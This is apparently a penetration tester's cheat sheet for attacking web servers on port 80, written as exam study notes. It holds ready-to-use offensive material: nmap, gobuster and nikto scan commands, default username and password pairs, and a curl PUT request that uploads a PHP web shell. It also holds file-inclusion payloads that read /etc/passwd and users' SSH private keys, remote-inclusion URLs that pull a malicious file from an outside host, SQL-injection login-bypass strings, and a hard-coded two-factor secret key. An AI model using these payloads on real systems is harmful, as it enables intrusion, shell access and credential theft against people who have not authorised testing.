# Port 80 HTTP

## Enumeration

- Server:
  Scripting language:
  Apache Modules:
  Domain-name address:

- Web application
  Name:
  Version:

- Don't forget non-standard ports that look like http

- ### nmap Script Scan

	  nmap -sV -Pn -vv --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt,http-devframework,http-enum,http-frontpage-login,http-git,http-iis-webdav-vuln,http-php-version,http-robots.txt,http-shellshock,http-vuln-cve2015-1635 -p 80 <target_address>

- ### gobuster

  - Directory Scan

        gobuster dir -u <target_url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o <output_file>

  - Deep Scan

	    gobuster dir -x html,php,txt,js,json,bak,bmp,jpg,jpeg,gif -u <target_url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o <output_file>
	
- ### nikto

      nikto -h http://<target_address>

  - Nikto with squid proxy

        nikto -h -useproxy http://<target_address>:4444

- ### Check for common files
  -  robots.txt
  -  .htaccess

- ### Check for directory traversal

      dotdotpwn.pl -m http -h http://<target_address> -M GET -o [windows|unix|generic]
	
- ### Default/Weak logins

  Google documentation for default passwords and test them:

  site:webapplication.com password

  admin admin
  admin password
  admin <empty_string>
  admin nameofservice
  root root
  root admin
  root password
  root nameofservice
  <username_> password
  <username_> admin
  <username_> username
  <username_> nameofservice
	
 - ### curl

   - Get Header
		
		 curl -I http://<target_address> 

   - Get everything

		 curl -i http://<target_address>

   - Get everything; follow redirect

         curl -i -L  http://<target_address>

   - Check for title and all links

		 curl -s -L http://<target_address> | grep "title\|href" | sed -e 's/^[[:space:]]*//'

   - Look at page with just text

		 curl -s -L http://<target_address> | html2text -width '99' | uniq

   - Check if it is possible to upload using put
		
		 curl -v -X OPTIONS http:///<target_address>
		 curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://<target_address>/test/shell.php
		
- ### Password brute force - last resort

	Crawl/build wordlist from entire site with cewl

## Bypassing File Upload Restrictions
https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/

## View PHP source

- php://filter/convert.base64-encode/resource=<php_file_path>
  Ex:
	
	  http://192.168.152.58/image.php?img=php://filter/convert.base64-encode/resource=/var/www/html/image.php

- php://filter/convert.base64-encode/resource=/var/www/html/db.php
  Ex: 
      
	  http://vulnerable-website/file.php?file=../../../../etc/passwd

## WebDAV

- davtest	

	Tests WebDAV enabled servers by uploading test executable files
		(Optional) Uploads files which allow for command execution or other actions directly on the target.
 
	davtest -url http://<target_address> 

- cadaver

	A command-line WebDAV client for Unix.
	

	
Google Authenicator

	Generate 2fa token with https://totp.danhersam.com/ using secret key ND4LKCSFMUQISO6CBZQATLDP
		Reference: https://github.com/itemir/apache_2fa

LFI/RFI


- Kadimus

	/root/Tools/Kadimus/kadimus -u http://<target_address>/example.php?page=


- Bypass execution

	http://<target_address>/index.php?page=php://filter/convert.base64-encode/resource=index
	base64 -d savefile.php

- Bypass extension

	http://<target_address>/page=http://192.168.1.101/maliciousfile.txt%00
	http://<target_address>/page=http://192.168.1.101/maliciousfile.txt?
	
- PHP
	https://cobalt.io/blog/a-pentesters-guide-to-file-inclusion

- If have LFI, check:

	/home/<user>/.ssh/id_rsa
	/home/<user>/.ssh/authorized_keys
	/home/<user>/.bash_history (and other shell histories)
	/home/<user>/.profile (and other shell profiles)

SQL-Injection

	https://xapax.gitbooks.io/security/content/sql-injections.html
	
	This is the most classic, standard first test:

	' or '1'='1

	Then you have:
	-'
	' '
	'&'
	'^'
	'*'
	' or ''-'
	' or '' '
	' or ''&'
	' or ''^'
	' or ''*'
	"-"
	" "
	"&"
	"^"
	"*"
	" or ""-"
	" or "" "
	" or ""&"
	" or ""^"
	" or ""*"
	or true--
	" or true--
	' or true--
	") or true--
	') or true--
	' or 'x'='x
	') or ('x')=('x
	')) or (('x'))=(('x
	" or "x"="x
	") or ("x")=("x
	")) or (("x"))=(("x

NOT FOR EXAM    NOT FOR EXAM    NOT FOR EXAM

- Post

	./sqlmap.py -r search-test.txt -p tfUPass

- Get
	
	sqlmap -u "http://<target_address>/index.php?id=1" --dbms=mysql

- Crawl

	sqlmap -u http://<target_address> --dbms=mysql --crawl=3

NOT FOR EXAM    NOT FOR EXAM    NOT FOR EXAM


Sql-login-bypass

	- Open Burp-suite
	- Make and intercept request
	- Send to intruder
	- Cluster attack
	- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
	- Attack
	- Check for response length variation